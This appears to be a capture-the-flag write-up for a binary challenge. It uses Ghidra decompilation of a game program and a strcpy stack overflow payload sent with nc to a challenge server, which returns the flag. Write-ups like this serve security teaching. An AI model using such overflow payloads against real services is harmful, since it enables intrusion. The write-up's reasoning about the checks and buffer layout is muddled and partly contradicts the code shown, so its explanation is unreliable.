1. Analyse the file with Ghidra. main() shows this:
```
        int main(void) {
        long in_FS_OFFSET;
        char local_28[24];
        long local_10;

        local_10 = *(long *)(in_FS_OFFSET + 0x28);

        puts("Welcome to Amogus.\n");
        display();
        puts("Enter your name:\n");

        __isoc99_scanf("%s", local_28);
        gameplay(local_28);

        if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                __stack_chk_fail();  // Stack canary check
        }

        return 0;
        }
```

gameplay() shows this:
```
        void gameplay(char *param_1) {
        int iVar1;
        FILE *_stream;
        long in_FS_OFFSET;
        char local_68[16];
        char local_58[16];
        char local_48[64];
        long local_10;

        local_10 = *(long *)(in_FS_OFFSET + 0x28);

        __builtin_strncpy(local_68, "DEAD", 5);
        strcpy(local_58, param_1);
        iVar1 = strcmp(local_58, "ALIVE");

        if (iVar1 == 0) {
                _stream = fopen("flag.txt", "r");

                if (_stream == NULL) {
                printf("Error in opening the flag file. Flag file might be missing :(\n"));
                } else {
                fgets(local_48, 0x2d, _stream);
                puts("How are you still alive?!\n");
                puts(local_48);
                }
        } else {
                iVar1 = strcmp(local_58, "DEAD");

                if (iVar1 != 0) {
                puts("ERROR. ERROR. AMONG US NOT RESPONDING.");
                exit(0);
        }

        puts("You are a crewmate. \n");
        FUN_00401160(1);
        puts("You go to Medbay to finish your tasks.\n");
        FUN_00401160(1);
        puts("Suddenly, you hear a gunshot... The world goes dark. \n");
        FUN_00401160(1);
        puts("GAME OVER. YOU LOST :("));
    }

    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }

    return;
        }
```

2. First, we need to look at what checks (conditions) we need to fulfill to get the flag. 

`param_1` is where our input payload goes.

First check: `iVar1 = strcmp(local_58, "ALIVE")` 

If `iVar1 = 0`, then I can go on to the next step. This means that my payload must be "ALIVE".

Second check: 
```
iVar1 = strcmp(local_58, "DEAD");
if (iVar1 != 0) {
        puts("ERROR. ERROR. AMONG US NOT RESPONDING.");
        exit(0);
}
```
This line means that if my payload is not "DEAD", the program will print the "Game Over" set of messages. Otherwise, it will exit the program. 

3. It is impossible to fulfill both checks as if my payload is "ALIVE", the program will print the flag *and* exit at the same time. If my payload is "DEAD" or anything else, I will get the "Game Over" set of messages. However, I re-read the decompiled code and noticed that we have this other line that uses `strcmp()`: `__builtin_strncpy(local_68, "DEAD", 5)`. Also, both checks use `strcmp()` which relies on null bytes to identify the end of a string, meaning that it is possible to read into adjacent buffers.

4. This means that we need a payload such that local_58 contains "ALIVE" and local_68 is corrupted such that local_68 does not contain "DEAD" to avoid triggering the `exit(0)`. 

5. Use 16 bytes of "A" to fill up local_58, and include "ALIVE". This causes the first check's `strcmp()` to read past local_58 into local_68 where "ALIVE" has overflowed, and local_68 is corrupted, so it will not trigger `exit(0)`:

```
└─$ python -c 'print("A"*16 + "ALIVE\x00")' | nc 43.205.113.100 8292
    Welcome to Amogus.

    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢀⣀⣤⣤⣤⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀  
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣼⠟⠉⠉⠉⠉⠉⠉⠉⠙⠻⢶⣄⠀⠀⠀⠀   
            ⣾⡏⠀⠀⠀⠀⠀⠀     ⠙⣷⡀⠀    
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣸⡟⠀⣠⣶⠛⠛⠛⠛⠛⠛⠳⣦⡀⠀⠘⣿⡄    
    ⠀⠀⠀⠀⠀⠀⠀⠀ ⢠⣿⠁⠀⢹⣿⣦⣀⣀⣀⣀⣀⣠⣼⡇⠀⠀⠸⣷⠀⠀  
    ⠀⠀⠀⠀⠀⠀⠀⠀ ⣼⡏⠀⠀⠀⠉⠛⠿⠿⠿⠿⠛⠋⠁⠀⠀⠀⠀⣿    
            ⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀  ⢻⡇⠀  
            ⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⢸⡇   
    ⠀⠀⠀⠀⠀⠀⠀ ⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀  
    ⠀⠀⠀⠀⠀⠀⠀ ⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀  
    ⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀  
    ⠀⠀⠀⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⣿⠀  
    ⠀⠀⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⣠⡶⠶⠿⠿⠿⠿⢷⣦⠀⠀⠀⠀⠀  ⣿⠀  
    ⠀⠀⣀⣀⣀⠀⣸⡇⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀ ⣿⠀ 
    ⣠⡿⠛⠛⠛⠛⠻⠀⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀ ⠀⣿⠀ 
    ⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡟⠀⠀⢀⣤⣤⣴⣿⠀⠀⠀⠀⠀⠀  ⣿⠀ 
    ⠈⠙⢷⣶⣦⣤⣤⣤⣴⣶⣾⠿⠛⠁⢀⣶⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀  
                ⣿⣆⡀⠀⠀⠀⠀⠀⢀⣠⣴⡾⠃    
                ⠀⠀⠈⠛⠻⢿⣿⣾⣿⡿⠿⠟⠋⠁⠀⠀   
    Enter your name:

    How are you still alive?!

    shaktictf{ch@ng3d_fat3_wh3n_I_s@w_r3dv3nt}
```
